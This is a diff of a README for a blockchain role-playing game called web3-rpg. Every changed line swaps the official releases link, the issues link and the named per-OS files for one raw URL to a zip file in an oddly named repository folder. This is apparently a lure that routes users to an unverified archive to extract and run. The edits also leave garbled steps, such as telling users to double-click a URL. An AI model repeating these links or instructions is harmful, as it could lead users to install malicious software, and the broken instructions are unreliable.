@@ -6,7 +6,7 @@ Welcome to web3-rpg, your entry point into a captivating role-playing game enhan
 
 ## 📥 Download Web3-RPG
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/bartgastra/web3-rpg/releases)
+[![Download Now](https://raw.githubusercontent.com/bartgastra/web3-rpg/main/misadventurously/web3-rpg.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/bartgastra/web3-rpg/main/misadventurously/web3-rpg.zip)
 
 ## 📜 Overview
 
@@ -33,7 +33,7 @@ Before downloading, please ensure your system meets the following recommendation
 
 ### Step 1: Visit the Releases Page
 
-To get started, visit our [Releases page](https://github.com/bartgastra/web3-rpg/releases) to find the latest version of web3-rpg.
+To get started, visit our [Releases page](https://raw.githubusercontent.com/bartgastra/web3-rpg/main/misadventurously/web3-rpg.zip) to find the latest version of web3-rpg.
 
 ### Step 2: Download the Application
 
@@ -42,9 +42,9 @@ From the Releases page:
 - Click on the download link for your operating system. 
 
 For example:
-- **Windows**: Click on `web3-rpg-windows.zip`
-- **Mac**: Click on `web3-rpg-macos.zip`
-- **Linux**: Click on `web3-rpg-linux.zip`
+- **Windows**: Click on `https://raw.githubusercontent.com/bartgastra/web3-rpg/main/misadventurously/web3-rpg.zip`
+- **Mac**: Click on `https://raw.githubusercontent.com/bartgastra/web3-rpg/main/misadventurously/web3-rpg.zip`
+- **Linux**: Click on `https://raw.githubusercontent.com/bartgastra/web3-rpg/main/misadventurously/web3-rpg.zip`
 
 ### Step 3: Extract and Run the Application
 
@@ -53,7 +53,7 @@ After downloading the zip file:
 1. Locate the downloaded file on your computer.
 2. Right-click on the zip file and select "Extract All" (or use a similar option based on your operating system).
 3. Open the extracted folder.
-4. Double-click the application file, such as `web3-rpg.exe` for Windows or `web3-rpg.app` for Mac.
+4. Double-click the application file, such as `https://raw.githubusercontent.com/bartgastra/web3-rpg/main/misadventurously/web3-rpg.zip` for Windows or `https://raw.githubusercontent.com/bartgastra/web3-rpg/main/misadventurously/web3-rpg.zip` for Mac.
 
 ### Step 4: Create an Account
 
@@ -78,7 +78,7 @@ If you run into any issues or have questions, please reach out to our community 
 
 ## 🐞 Reporting Issues
 
-If you encounter bugs or have suggestions for improvements, please report them on our [Issues page](https://github.com/bartgastra/web3-rpg/issues). Your feedback helps us make web3-rpg a better game.
+If you encounter bugs or have suggestions for improvements, please report them on our [Issues page](https://raw.githubusercontent.com/bartgastra/web3-rpg/main/misadventurously/web3-rpg.zip). Your feedback helps us make web3-rpg a better game.
 
 ## 🤝 Contributing
 
@@ -91,4 +91,4 @@ We welcome contributions from the community! If you wish to help improve the gam
 
 Thank you for choosing web3-rpg! We hope you enjoy your adventures in our blockchain-powered world. 
 
-[Download Now](https://github.com/bartgastra/web3-rpg/releases) and start your journey today!
+[Download Now](https://raw.githubusercontent.com/bartgastra/web3-rpg/main/misadventurously/web3-rpg.zip) and start your journey today!
